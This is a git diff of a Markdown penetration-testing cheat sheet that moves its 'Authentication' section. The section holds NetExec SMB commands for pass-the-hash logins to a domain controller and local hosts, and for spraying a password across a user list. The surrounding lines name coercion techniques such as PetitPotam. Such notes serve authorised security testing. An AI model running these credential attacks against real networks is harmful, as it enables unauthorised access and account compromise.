@@ -272,6 +272,36 @@ How to pentest like a Gunnaj
   
 </details>
 
+# Authentication
+    
+<details>
+  <summary> NetExec domain authentication </summary> 
+  
+  ```shell
+  sudo NetExec smb <Domain_Controller_IP> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> 
+  ```
+
+</details> 
+  
+<details>
+  <summary> NetExec local authentication </summary> 
+  
+  ```shell
+  NetExec smb <target_IP> -u <username> -H <hash[LM:NT]> --local-auth 
+  ```
+
+</details> 
+
+<details>
+  <summary> NetExec Password spray </summary> 
+  
+  ### Spray a password on a user list
+  ```shell
+  NetExec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on-success
+  ```
+
+</details> 
+
 # Acitve directory enumeration
 
 <details>
@@ -596,36 +626,6 @@ pre2k auth -d <AD_domain> -dc-ip <Domain_Controller_IP>
   * PetitPotam
   * printerbug
   * dfscoerce
-</details> 
-
-# Authentication
-    
-<details>
-  <summary> NetExec domain authentication </summary> 
-  
-  ```shell
-  sudo NetExec smb <Domain_Controller_IP> -u <AD_user> -p <AD_password> -H <hash[LM:NT]> 
-  ```
-
-</details> 
-  
-<details>
-  <summary> NetExec local authentication </summary> 
-  
-  ```shell
-  NetExec smb <target_IP> -u <username> -H <hash[LM:NT]> --local-auth 
-  ```
-
-</details> 
-
-<details>
-  <summary> NetExec Password spray </summary> 
-  
-  ### Spray a password on a user list
-  ```shell
-  NetExec smb <Domain_Controller_IP> -u users.txt -p <password> --continue-on-success
-  ```
-
 </details> 
 
 # Share enumeration
